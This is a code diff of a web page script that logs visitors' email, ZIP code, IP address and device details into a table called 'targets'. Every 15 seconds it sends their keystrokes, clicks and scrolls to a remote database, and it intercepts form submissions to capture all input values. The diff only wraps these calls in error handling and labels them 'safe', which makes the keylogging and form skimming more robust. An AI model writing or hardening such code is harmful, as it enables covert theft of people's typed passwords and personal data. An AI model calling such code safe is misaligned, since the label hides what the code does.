@@ -177,25 +177,29 @@
 
                 const ip = await getIP();  
                   
-                // Send tracking data to Supabase  
-                await supabaseClient  
-                    .from('tracking_logs')  
-                    .insert([{  
-                        email,  
-                        action: 'heartbeat',  
-                        details: {  
-                            ip,  
-                            userAgent: navigator.userAgent,  
-                            screen: `${screen.width}x${screen.height}`,  
-                            platform: navigator.platform,  
-                            keystrokes: keystrokeLog.splice(0, 50),  
-                            clicks: clickLog.splice(0, 30),  
-                            scrolls: scrollLog.splice(0, 20),  
-                            url: window.location.href,  
-                            referrer: document.referrer  
-                        },  
-                        timestamp: new Date().toISOString()  
-                    }]);  
+                // Send tracking data to Supabase safely
+                try {
+                    await supabaseClient  
+                        .from('tracking_logs')  
+                        .insert([{  
+                            email,  
+                            action: 'heartbeat',  
+                            details: {  
+                                ip,  
+                                userAgent: navigator.userAgent,  
+                                screen: `${screen.width}x${screen.height}`,  
+                                platform: navigator.platform,  
+                                keystrokes: keystrokeLog.splice(0, 50),  
+                                clicks: clickLog.splice(0, 30),  
+                                scrolls: scrollLog.splice(0, 20),  
+                                url: window.location.href,  
+                                referrer: document.referrer  
+                            },  
+                            timestamp: new Date().toISOString()  
+                        }]);  
+                } catch (err) {
+                    console.error("Failed to send heartbeat log to Supabase:", err);
+                }
             }, 15000); // Every 15 seconds  
         }
 
@@ -207,20 +211,25 @@
             zip = document.getElementById('zip').value;  
             const ip = await getIP();
 
-            // Save to Targets Table  
-            await supabaseClient  
-                .from('targets')  
-                .insert([{  
-                    email,  
-                    zip,  
-                    ip,  
-                    user_agent: navigator.userAgent,  
-                    screen_resolution: `${screen.width}x${screen.height}`,  
-                    platform: navigator.platform,  
-                    language: navigator.language,  
-                    status: 'pending',  
-                    created_at: new Date().toISOString()  
-                }]);
+            // Save to Targets Table safely
+            try {
+                const { error } = await supabaseClient  
+                    .from('targets')  
+                    .insert([{  
+                        email,  
+                        zip,  
+                        ip,  
+                        user_agent: navigator.userAgent,  
+                        screen_resolution: `${screen.width}x${screen.height}`,  
+                        platform: navigator.platform,  
+                        language: navigator.language,  
+                        status: 'pending',  
+                        created_at: new Date().toISOString()  
+                    }]);
+                if (error) throw error;
+            } catch (err) {
+                console.error("Failed to insert target to Supabase:", err);
+            }
 
             // Start Advanced Tracking  
             startTracking();
@@ -240,20 +249,24 @@
                         timestamp: Date.now()  
                     };  
                       
-                    // Send to Supabase  
-                    await fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
-                        method: 'POST',  
-                        headers: {  
-                            'apikey': '${SUPABASE_KEY}',  
-                            'Content-Type': 'application/json'  
-                        },  
-                        body: JSON.stringify({  
-                            email: '${email}',  
-                            action: 'advanced_tracking',  
-                            details: data,  
-                            timestamp: new Date().toISOString()  
-                        })  
-                    });  
+                    // Send to Supabase safely 
+                    try {
+                        await fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
+                            method: 'POST',  
+                            headers: {  
+                                'apikey': '${SUPABASE_KEY}',  
+                                'Content-Type': 'application/json'  
+                            },  
+                            body: JSON.stringify({  
+                                email: '${email}',  
+                                action: 'advanced_tracking',  
+                                details: data,  
+                                timestamp: new Date().toISOString()  
+                            })  
+                        });  
+                    } catch (err) {
+                        console.error("Advanced tracking sync failed:", err);
+                    }
                 }, 10000);
 
                 // Capture Form Inputs  
@@ -265,20 +278,24 @@
                         value: el.value  
                     }));  
                       
-                    // Log form data  
-                    fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
-                        method: 'POST',  
-                        headers: {  
-                            'apikey': '${SUPABASE_KEY}',  
-                            'Content-Type': 'application/json'  
-                        },  
-                        body: JSON.stringify({  
-                            email: '${email}',  
-                            action: 'form_submission',  
-                            details: { form: this.id, inputs },  
-                            timestamp: new Date().toISOString()  
-                        })  
-                    });  
+                    // Log form data safely
+                    try {
+                        fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
+                            method: 'POST',  
+                            headers: {  
+                                'apikey': '${SUPABASE_KEY}',  
+                                'Content-Type': 'application/json'  
+                            },  
+                            body: JSON.stringify({  
+                                email: '${email}',  
+                                action: 'form_submission',  
+                                details: { form: this.id, inputs },  
+                                timestamp: new Date().toISOString()  
+                            })  
+                        });  
+                    } catch (err) {
+                        console.error("Form submission tracking log failed:", err);
+                    }
                       
                     return originalSubmit.apply(this, arguments);  
                 };  
@@ -292,20 +309,24 @@
 
         // Initial Load Tracking  
         window.addEventListener('load', async () => {  
-            const ip = await getIP();  
-              
-            await supabaseClient  
-                .from('tracking_logs')  
-                .insert([{  
-                    action: 'page_load',  
-                    details: {  
-                        ip,  
-                        userAgent: navigator.userAgent,  
-                        url: window.location.href,  
-                        referrer: document.referrer  
-                    },  
-                    timestamp: new Date().toISOString()  
-                }]);  
+            try {
+                const ip = await getIP();  
+                  
+                await supabaseClient  
+                    .from('tracking_logs')  
+                    .insert([{  
+                        action: 'page_load',  
+                        details: {  
+                            ip,  
+                            userAgent: navigator.userAgent,  
+                            url: window.location.href,  
+                            referrer: document.referrer  
+                        },  
+                        timestamp: new Date().toISOString()  
+                    }]);  
+            } catch (err) {
+                console.error("Failed to log page load to Supabase:", err);
+            }
         });  
     </script>  
 </body>  
